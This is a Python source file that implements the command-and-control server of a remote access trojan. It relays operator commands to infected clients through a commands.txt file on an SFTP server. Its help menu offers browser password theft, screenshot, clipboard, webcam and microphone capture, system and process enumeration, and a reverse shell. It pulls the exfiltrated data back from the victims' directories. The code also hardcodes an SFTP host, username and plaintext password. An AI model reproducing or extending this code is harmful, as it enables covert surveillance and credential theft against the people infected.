#This file shall implement the command and control server for the client
#it will connect to an FTP server and edit a file called "commands.txt". The client will read this file and execute the commands! 
#no other (direct) connection should be built up between client and server (only if strictly requested).
#The Server should also be able to recieve the reverse shell from the client, he does this by getting the clients ip from the sftp server and opening up a port for it.

#Imports
import os
import socket
from ctypes import *
import pythoncom, pyWinhook, win32clipboard, win32gui, win32ui, win32con, win32api, pyaes, win32cred, pywintypes
import sqlite3, shutil, win32crypt, win32process, sys, random, pygame, time
from sys import gettrace as sys_gettrace
from tkinter import *
import pysftp
from _thread import *

#Global Variables


#Functions
#------------------------Connection to FTPS server------------------------
def ftps_connect():
    cnopts = pysftp.CnOpts()
    cnopts.hostkeys = None
    ftps = pysftp.Connection(host="192.168.0.104", username="desktop-722h3i8\manue", password="Tennis12!", cnopts=cnopts)
    return ftps

def ftps_upload_file(ftps, file):
    try:
        ftps.put(file, preserve_mtime=True)
    except:
        print("Error uploading file")

def ftps_download_file(ftps, file):
    try:
        ftps.get(file, open(file, 'wb').write)
    except: 
        print("File not found")

def ftps_create_dir(ftps, dir):
    try:
        ftps.mkdir(str(dir))
        ftps.chdir(str(dir))
    except:
        print("Directory exists already")

def ftps_check_dir(ftps, dir):
    try:
        ftps_create_dir(ftps, dir)
        ftps.chdir(dir)
        return True
    except:
        print("Directory creation failed!")
        return False

#get all new directories from the ftp server
def get_new_dirs(ftps):
    captured_dirs = []
    dirs = ftps.listdir()
    #find all dirs with "0!?%" in name
    for dir in dirs:
        print(dir)
        if "0_0_2" in dir:
            captured_dirs.append(dir)
    
    print(captured_dirs)
    #download all files from the captured_dirs
    for dir in captured_dirs:
        try:
            os.mkdir(dir)
        except:
            pass
        ftps.get_r(dir, '', preserve_mtime=True)
#------------------------END Connection to FTPS server------------------------

#------------------------Create command file (write the commands to file from user input throughout console------------------------
def create_command_file(ftps):
    #take input from user
    while True:
        file = open("commands.txt", "w")
        print("[+] Welcome to the interactive command shell!")
        print("[+] Please enter a command to execute on the client!")
        print("[+] The commands will be executed via SFTP commands.txt file!")
        print("[+] You can also spawn a reverse shell from here by typing 'reverse_shell'")
        print("[+] Type help for a list of commands! (exit to exit)")
        command = input("Enter command: ")
        if (command == "help"):
            print("[+] The following commands are available:")
            print("[+] reverse_shell: opens up an interactive reverse shell on the client. Be careful, this will be a direct connection to the client!")
            print("[+] get passwords: gets all the stored passwords from firefox and chrome (at least tries to) and sends them to the sftp server. Can be downloaded by get files command!")
            print("[+] get files: gets all the files from the sftp server and downloads them to the current directory!")
            print("[+] get screenshot: takes a screenshot of the clients screen and sends it to the sftp server. Can be downloaded by get files command!")
            print("[+] get clipboard: gets the clipboard content of the client and sends it to the sftp server. Can be downloaded by get files command!")
            print("[+] get webcam: gets the webcam content of the client and sends it to the sftp server. Can be downloaded by get files command!")
            print("[+] get microphone: gets the microphone content of the client and sends it to the sftp server. Can be downloaded by get files command!")
            print("[+] get system info: gets the system information of the client and sends it to the sftp server. Can be downloaded by get files command!")
            print("[+] get process: gets the process information of the client and sends it to the sftp server. Can be downloaded by get files command!")
            print("[+] exit = exit")
            command = input("Enter command: ")
        elif (command == "reverse_shell"):
            file.write("reverse_shell")
            #server ip:
            server_ip = socket.gethostbyname(socket.gethostname())
            file.write(str(server_ip))
        elif (command == "get passwords"):
            file.write("get passwords")
        elif (command == "get files"):
            get_new_dirs(ftps)
        elif (command == "get screenshot"):
            file.write("get screenshot")
        elif (command == "get clipboard"):
            file.write("get clipboard")
        elif (command == "get webcam"):
            file.write("get webcam")
        elif (command == "get microphone"):
            file.write("get microphone")
        elif (command == "get system info"):
            file.write("get system info")
        elif (command == "exit"):
            break
        os.system('cls' if os.name == 'nt' else 'clear')
        file.write(command)
        file.close()
        print("[+] Command written to file: " + str(command) + " ! As the client only gets them periodically (every 30 seconds) it might take a while until the command is executed!")
        
        #upload file to ftps server
        captured_dirs = []
        dirs = ftps.listdir()
        #find all dirs with "0!?%" in name
        for dir in dirs:
            if "0_0_2" in dir:
                captured_dirs.append(dir)
    
        #uplpad file to all captured dirs
        for dir in captured_dirs:
            try:
                ftps.chdir(dir)
                ftps.put("commands.txt", preserve_mtime=True)
            except:
                print("Error uploading Commands file")

        #show countdown on console
        print("[+] This console will sleep now during upload/download time from client. Please be patient!")
        time.sleep(2)
        for i in range(30, 0, -1):
            print("[+] " + str(i) + " seconds left until next command!")
            time.sleep(1)
            os.system('cls' if os.name == 'nt' else 'clear')


#------------------------Command and Control Server Main------------------------
#Test all of the above functions:
def main():
    while True:
        try:
            ftps = ftps_connect() #for ipv4 connection test
            print("Connected to FTPS server! Debugging purpose, delete later!!")
        except:
            time.sleep(20)
        
        create_command_file(ftps)

#------------------------END Command and Control Server Main------------------------



if __name__ == "__main__":
    main()
